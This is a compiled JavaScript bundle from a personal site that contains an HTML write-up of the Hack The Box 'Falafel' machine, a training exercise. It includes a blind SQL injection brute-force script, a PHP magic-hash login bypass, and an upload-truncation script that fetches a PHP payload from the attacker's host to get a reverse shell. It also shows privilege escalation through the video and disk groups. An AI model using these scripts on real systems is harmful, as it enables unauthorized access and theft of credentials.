"use strict";(self["webpackChunkpersonal_website"]=self["webpackChunkpersonal_website"]||[]).push([[952],{6994:function(e,t,a){a.r(t),a.d(t,{default:function(){return R}});var o=a(6768),s=a.p+"img/image_1.4d280d6d.png",n=a.p+"img/image_2.de918e36.png",i=a.p+"img/image_3.2595e7c9.png",r=a.p+"img/image_4.3ffa5a0f.png",l=a.p+"img/image_5.6a2677d3.png",p=a.p+"img/image_6.fae415f6.png",h=a.p+"img/image_7.61a40d7f.png",d=a.p+"img/image_8.b98e695e.png",u=a.p+"img/image_9.a231ab0d.png",c=a.p+"img/image_10.e71dc6c0.png",g=a.p+"img/image_11.511be84f.png",m=a.p+"img/image_12.23a2b90d.png",f=a.p+"img/image_16.d1d1e4a8.png",b=a.p+"img/image_15.72c17321.png",w=a.p+"img/image_17.2939e866.png",y=a.p+"img/image_18.dbe88e35.png",_=a.p+"img/image_19.3a69bc83.png",q=a.p+"img/image_20.ed1c5199.png",v=a.p+"img/image_21.cf3406d5.png",x=a.p+"img/image_22.ebc8ab6a.png",S=a.p+"img/image_23.102b57b3.png";const T={class:"component-writeup"},j=(0,o.Fv)('<h1>Recon</h1><h2>Nmap</h2><pre><code>nmap -Pn -v -p- -sV --min-rate 5000 falafel.htb -oN falafel.txt\n</code></pre><pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n</code></pre><h1>Initial Foothold (Port 80)</h1><p>Main login page <img src="'+s+'" alt="Screenshots"></p><p>By attempting some common username and password combination (e.g. admin:admin), it was observed that different user input seem to produce a different response on the login page.</p><p>Most usernames will return “Try again…”. <img src="'+n+'" alt="Screenshots"></p><p>But for the user “admin”, the response is “Wrong identification: admin”. This seems to suggest that valid username can be discovered through bruteforcing. <img src="'+i+'" alt="Screenshots"></p><p>A simple wfuzz command is used to find usernames that does not return the “Try again…” message.</p><pre><code>wfuzz -u http://falafel.htb/login.php -X POST -d &quot;username=FUZZ&amp;password=admin&quot; -w /usr/share/seclists/Usernames/... --hw 657\n</code></pre><p>The following usernames seems to be valid at first glance.</p><pre><code>admin\nchris\nsleepy\n</code></pre><p>However, the response length of username “sleepy” is a bit different from the others. Somehow using the username “sleepy” returns a new message “Hacking attempt detected”. <img src="'+r+'" alt="Screenshots"></p><p>So based on these observation, some assumptions were made:</p><ul><li>Blind SQL injection seems to be possible</li><li>Some level of SQLi prevention is present</li></ul><p>The first step is to figure out if there are any other SQL-related keywords that are blacklisted. These are the ones discovered:</p><pre><code>sleep\nunion\nbenchmark\n</code></pre><p>Since we’ve got 2 seemingly valid usernames, the following boolean-based injection payload seems to work well for identifying if the query is successful or not.</p><pre><code>chris&#39; AND 1=1;-- - # Returns &quot;Wrong Identification&quot;\nchris&#39; AND 1=0;-- - # Returns &quot;Try again...&quot;\n</code></pre><p>However, I was a bit stuck here as I have no idea about the table structure or even the table name. Just by guessing, I assumed that there should be column named “password” and created tried the following payload.</p><pre><code>chris&#39; AND password LIKE &#39;%&#39;;-- -\n</code></pre><p>The query returns a positive result (&quot;Wrong Identification), which confirms that there is a column named “password”. <img src="'+l+'" alt="Screenshots"></p><p>To extract the password of user “chris” and “admin”, a python script is created to bruteforce through the blind boolean-based SQL injection.</p><pre><code class="language-python">def sql_bruteforce_password(session, username):\n    # Bruteforcing number of columns in the table\n    global target_login_url\n    json_login_data = {&#39;username&#39;:&#39;chris&#39;, &#39;password&#39;:&#39;admin&#39;}\n    col_num = 0\n    for i in range (1,10):\n        payload = f&quot;chris&#39; ORDER BY {i};-- -&quot;\n        json_login_data[&#39;username&#39;] = payload\n        r = session.post(target_login_url, data=json_login_data)\n        if (&quot;Wrong identification&quot; in r.text):\n            col_num = i\n    print(f&quot;Number of columns in current table: {col_num}&quot;)\n\n    # Bruteforcing user password\n    alphabet_list = string.ascii_lowercase + string.digits\n    password = &#39;&#39;\n    end_flag = False\n    while (not end_flag):\n        for word in alphabet_list:\n            payload = f&quot;{username}&#39; AND password LIKE &#39;{password}{word}%&quot;\n            json_login_data[&#39;username&#39;] = payload\n            r = session.post(target_login_url, data=json_login_data)\n            if (&quot;Wrong identification&quot; in r.text):\n                #print(f&quot;Working payload: {word}&quot;)\n                password += word\n                print(f&quot;Working payload: {password}&quot;)\n                break\n            if (word == alphabet_list[-1]):\n                end_flag = True\n\n    print(f&quot;Password hash: {password}&quot;)\n    return\n</code></pre><p>The following password hashes were extracted and the password of user “chris” was cracked.</p><table><thead><tr><th>Username</th><th>Password Hash</th><th>Password</th></tr></thead><tbody><tr><td>chris</td><td>d4ee02a22fc872e36d9e3751ba72ddc8</td><td>juggling</td></tr><tr><td>admin</td><td>0e462096931906507119562988736854</td><td>N/A</td></tr><tr><td>Logging in as user chris, there is not much on the webpage except a profile page of chris. This is actually a hint for the next step.</td><td></td><td></td></tr><tr><td><img src="'+p+'" alt="Screenshots"></td><td></td><td></td></tr></tbody></table><p>Based on the profile, it seems to suggest PHP type juggling (as the website is PHP-based).</p><p>Through some online digging, it seems that if a lose comparison <code>==</code> or <code>!=</code> is used, PHP might consider variables as a different data type and leading to unexpected comparison results. For example, <code>&#39;0010e2&#39; == &#39;1e3&#39;</code> will return <code>true</code> as both variables are considered as an integer, where the “e” is the sign for exponential (so both are considered “1” as an integer).</p><p>Based on this interesting behaviour, we can see that the admin hash matches the property, where it could be considered as <code>0 ^ 462096931906507119562988736854</code> which is just “0”. Therefore, any string that produces a hash that starts with <code>0e</code> will be considered the same as the admin hash.</p><p>From this payload example list (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#magic-hashes">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type Juggling/README.md#magic-hashes</a>), there are different “magic hashes” that can achieve the same goal.</p><p>Using the string<code>&quot;240610708&quot;</code> as the password, we are able to login to the admin account. <img src="'+h+'" alt="Screenshots"></p><p>On the admin page, there is a new page that allows user to upload a file by providing a remote URL to download the image. <img src="'+d+'" alt="Screenshots"></p><p>By putting in a valid URL, it shows the command that was used to obtain the image. <img src="'+u+'" alt="Screenshots"> This suggests 2 possible vulnerabilities:</p><ul><li>OS command injection</li><li>Insecure file upload</li></ul><p>After some testing, it seems that OS command injection is not possible as all special characters are properly sanatized before being executed.</p><p>Through some fuzzing, it was found that only the following extensions are allowed:</p><ul><li>.png</li><li>.jpg</li><li>.gif</li></ul><p>From here, I have been trying to use different filter bypass techniques such as null byte poisoning, double extension to upload a PHP file for code execution. Despite checking hint on the admin profile page, I was still stuck for quite a long time and decided to have a peak at other’s writeup.</p><h2>Checking 0xdf writeup</h2><p>From the writeup (<a href="https://0xdf.gitlab.io/2018/06/23/htb-falafel.html">https://0xdf.gitlab.io/2018/06/23/htb-falafel.html</a>), it seems that I was not aware there is a filename length check implemented. The output of the page changes when a very long filename is provided in the URL. <img src="'+c+'" alt="Screenshots"></p><p>By checking the page source, we can see that the filename was truncated by removing trailing characters beyond the length limitation. <img src="'+g+'" alt="Screenshots"></p><p>This means that using a filename with a certain length and has a double extension (e.g. .php.jpg) will cause the trailing .jpg extension to be truncated, leaving the .php as the file extension.</p><p>To fuzz the exact length used, the following python script is used.</p><pre><code class="language-python"># Fuzzing filename limit\n    filename_length = 0\n    filename = &quot;&quot;\n    for i in range(0, 1000):\n        filename = &quot;A&quot; * i\n        json_upload_data[&#39;url&#39;] = f&quot;http://10.10.14.37:8888/{filename}.jpg&quot;\n        payload = target_upload_url + f&quot;/?url={json_upload_data[&#39;url&#39;]}&quot;\n        r = s.get(payload)\n        if (&#39;The name is too long&#39; in r.text):\n            print(f&quot;Filename starts to truncate at: {i}&quot;)\n            filename_length = i\n            break\n    filename = &quot;A&quot; * (filename_length - 1) + &quot;.php&quot;\n    json_upload_data[&#39;url&#39;] = f&quot;http://10.10.14.37:8888/{filename}.jpg&quot;\n    payload = target_upload_url + f&quot;/?url={json_upload_data[&#39;url&#39;]}&quot;\n    r = s.get(payload)\n    print(r.text)\n</code></pre><p>It shows that the filename limit is 233 (excluding the .jpg extension). <img src="'+m+'" alt="Screenshots"> Another script is then created to upload the payload with the very long filename</p><pre><code class="language-python">def file_upload_exploit(session):\n\n    &quot;&quot;&quot;\n    # Fuzzing filename limit\n    filename_length = 0\n    filename = &quot;&quot;\n    for i in range(0, 1000):\n        filename = &quot;A&quot; * i\n        json_upload_data[&#39;url&#39;] = f&quot;http://10.10.14.37:8888/{filename}.jpg&quot;\n        payload = target_upload_url + f&quot;/?url={json_upload_data[&#39;url&#39;]}&quot;\n        r = s.get(payload)\n        if (&#39;The name is too long&#39; in r.text):\n            print(f&quot;Filename starts to truncate at: {i}&quot;)\n            filename_length = i\n            break\n    &quot;&quot;&quot;\n    # Upload php file with long filename and double extension\n    json_upload_data = {&#39;url&#39;:&#39;&#39;}\n    filename_length = 233\n    filename = &quot;A&quot; * (filename_length - 1) + &quot;.php&quot;\n    json_upload_data[&#39;url&#39;] = f&quot;http://10.10.14.37:8888/{filename}.jpg&quot;\n    payload = target_upload_url + f&quot;/?url={json_upload_data[&#39;url&#39;]}&quot;\n    print(f&quot;Payload URL: {payload}&quot;)\n    r = session.get(payload)\n\n    # Get destination URL\n    if &quot;File not found&quot; in r.text:\n        print(&quot;Unable to locate exploit file&quot;)\n        sys.exit()\n    else:\n        soup = BeautifulSoup(r.content, &#39;html5lib&#39;)\n        html_pre_objects = soup.find_all(&#39;pre&#39;)\n\n        # Get directory name\n        directory = html_pre_objects[0].get_text().split(&quot; &quot;)[2].split(&quot;/&quot;)[5].split(&quot;;&quot;)[0]\n        output_url = target_payload_url + &quot;/&quot; + directory + &quot;/&quot; + filename\n        print(f&quot;File uploaded to: {output_url}&quot;)\n</code></pre><p><img src="'+f+'" alt="Screenshots"> A simple <code>phpinfo();</code> payload is uploaded and successfully executed as shown below. <img src="'+b+'" alt="Screenshots"> Then, a PHP reveres shell is created using <a href="http://revshells.com">revshells.com</a> and initial access to the server is obtained. <img src="'+w+'" alt="Screenshots"></p><h1>User.txt</h1><p>By checking the PHP files in /var/www/html, the connection.php file contained the credentials of user “moche” for the database connection. <img src="'+y+'" alt="Screenshots"> The credentials can be replayed to obtain access to the server as moche through SSH. <img src="'+_+'" alt="Screenshots"></p><h1>Root.txt</h1><p>From the screenshot above, we can see that the user was assigned to multiple system groups. The following groups seems to be interesting:</p><ul><li>adm: have access to log files in /var/log</li><li>audio: access to audio devices</li><li>video: access to video devices</li></ul><p>There is a useful blog post that lists what system groups are exploitable.</p><p><a href="https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/">https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/</a></p><p>(Note: this box was launched back in 2018, while the blog post is published in 2021, therefore this is not how people were able to solve the box back then. I guess it’s a little bit of cheating on my end)</p><h2>Abusing video group</h2><p>The video group allows user to access video device, which is basically the screen output. First, the following command are used to obtain the raw file of the video device output, along with the width and height of the video device.</p><pre><code class="language-bash">cp /dev/fb0 /tmp/fb0.raw\nwidth=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f1)\nheight=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2)\n</code></pre><p>Then, a perl script is used to convert the raw file into an image.</p><pre><code class="language-perl">#!/usr/bin/perl -w\n\n$w = shift || 240;\n$h = shift || 320;\n$pixels = $w * $h;\n\nopen OUT, &quot;|pnmtopng&quot; or die &quot;Can&#39;t pipe pnmtopng: $!\\n&quot;;\n\nprintf OUT &quot;P6%d %d\\n255\\n&quot;, $w, $h;\n\nwhile ((read STDIN, $raw, 2) and $pixels--) {\n   $short = unpack(&#39;S&#39;, $raw);\n   print OUT pack(&quot;C3&quot;,\n      ($short &amp; 0xf800) &gt;&gt; 8,\n      ($short &amp; 0x7e0) &gt;&gt; 3,\n      ($short &amp; 0x1f) &lt;&lt; 3);\n}\n\nclose OUT;\n</code></pre><p>With this, the following image was obtained showing the password of user “yossi”. <img src="'+q+'" alt="Screenshots"></p><h2>Abusing disk group</h2><p>Using the password, we can SSH into the server as yossi. We can see that yossi was assigned to some other system groups different from moshe.</p><p><img src="'+v+'" alt="Screenshots"></p><p>Again on the same blog post, it demonstrated that users in the disk group has access to raw data stored in disks and partitions.</p><p>By using debugfs, we are able to read files under /root, which included the SSH private key in /root/.ssh/id_rsa. <img src="'+x+'" alt="Screenshots"></p><p>And from here we can copy the SSH private key and login as root through SSH. <img src="'+S+'" alt="Screenshots"></p><h1>Lessons Learned</h1><h2>Fuzzing</h2><p>From this box, I’ve learned to write python scripts to perform blind SQL injection manually to extract user hashes as well as fuzzing the limitations of the upload functionality. While some steps were done simply by guessing (e.g. type of DBMS used, the existence of a “password” column), I’ve actually later learned some SQL injection payloads that can be used to extract detailed information as “sqlmap” would.</p><h2>Linux system groups and /dev directory</h2><p>Even though I’ve been using Linux for my job as a Red Teamer and for these CTF practices, I realized that I am still just a noob when it comes to Linux internals. Not only that I’ve learned how certain system groups can be abused, I’ve also learned a bit more about the Linux /dev directory where device files are located.</p><h1>Resources</h1><p><a href="https://www.youtube.com/watch?v=CUbWpteTfio&amp;ab_channel=IppSec">https://www.youtube.com/watch?v=CUbWpteTfio&amp;ab_channel=IppSec</a></p><p><a href="https://0xdf.gitlab.io/2018/06/23/htb-falafel.html">https://0xdf.gitlab.io/2018/06/23/htb-falafel.html</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/README.md</a></p><p><a href="https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/">https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type Juggling/README.md</a></p><p><a href="https://www.baeldung.com/linux/dev-directory">https://www.baeldung.com/linux/dev-directory</a></p>',80),k=[j];function A(e,t){return(0,o.uX)(),(0,o.CE)("div",T,k)}var I=a(1241);const P={},L=(0,I.A)(P,[["render",A]]);var R=L}}]);
//# sourceMappingURL=952.ae0846e7.js.map